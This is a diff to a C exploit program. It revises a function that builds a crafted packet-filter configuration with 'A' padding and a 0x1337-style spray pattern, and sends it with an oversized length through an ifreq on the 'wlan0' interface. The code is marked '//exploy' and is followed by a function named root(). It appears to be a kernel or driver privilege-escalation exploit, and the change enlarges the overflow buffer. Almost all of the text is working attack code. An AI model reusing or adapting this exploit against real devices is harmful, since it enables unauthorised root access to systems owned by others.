@@ -333,17 +333,19 @@ void print_chars(char* chs, int size){
 void prepare3(){
 	int ret;
 	int fd ;
-	struct tPacketFilterCfg cfg;
+	char data[0x1000];
+	struct tPacketFilterCfg* pCfg;
 	struct ifreq ifr;
 	char* ptr0;
 	unsigned int n0;
 	unsigned int n1;
 	
 	//cfg init
-	memset(&cfg, 0, 8);
-	memset((char*)(&cfg)+8, 'A', sizeof(cfg)-8);
+	pCfg = (struct tPacketFilterCfg*)&data;
+	memset(pCfg, 0, 8);
+	memset((char*)pCfg+8, 'A', sizeof(data)-8);
 	
-	ptr0 = (char*)&cfg + 0xB;
+	ptr0 = (char*)pCfg + 0xB;
 	n0 = 0;
 	n1 = 0x13370000;
 	do{//loc_401BFC
@@ -351,21 +353,23 @@ void prepare3(){
 		n0 = n0 + 4;
 	}while( n0 < 0xFF8 );
 	
-	cfg.filterAction = 0x1;
-	cfg.filterId = 0x0;
-	cfg.numParams = 0x4;
+	pCfg->filterAction = 0x1;
+	pCfg->filterId = 0x0;
+	pCfg->numParams = 0x4;
+	
+	print_chars( (char*)pCfg+3, 20);
 	
 	n0 = 0;
 	do{
-		cfg.paramsData[n0++].dataLength = 0;
-	}while( n0 < cfg.numParams-1 );
-	cfg.paramsData[n0++].dataLength = 0xD4;
+		pCfg->paramsData[n0++].dataLength = 0;
+	}while( n0 < pCfg->numParams-1 );
+	pCfg->paramsData[n0].dataLength = 0xD4;
 	
 	//ifr init
 	memset(&ifr, 0, sizeof(ifr));
 	
 	strcpy(ifr.ifr_ifrn.ifrn_name, "wlan0");
-	ifr.ifr_ifru.ifru_data = &cfg;
+	ifr.ifr_ifru.ifru_data = pCfg;
 	*(unsigned int*)( (char*)&ifr.ifr_ifru.ifru_data + sizeof(void*) ) = 0x1000;
 	
 	//exploy
@@ -384,12 +388,12 @@ void prepare3(){
 	print_chars( (char*)&ifr, 16 );
 	print_chars( (char*)&ifr.ifr_ifru.ifru_data, sizeof(ifr)-16);
 	
-	print_chars( (char*)&cfg, 3);
-	print_chars( (char*)&cfg+23, 20);
-	print_chars( (char*)&cfg+43, 20);
-	print_chars( (char*)&cfg+63, 20);
-	print_chars( (char*)&cfg+83, 20);
-	print_chars( (char*)&cfg+103, 20);
+	print_chars( (char*)pCfg, 3);
+	print_chars( (char*)pCfg+23, 20);
+	print_chars( (char*)pCfg+43, 20);
+	print_chars( (char*)pCfg+63, 20);
+	print_chars( (char*)pCfg+83, 20);
+	print_chars( (char*)pCfg+103, 20);
 }
 
 void root(){
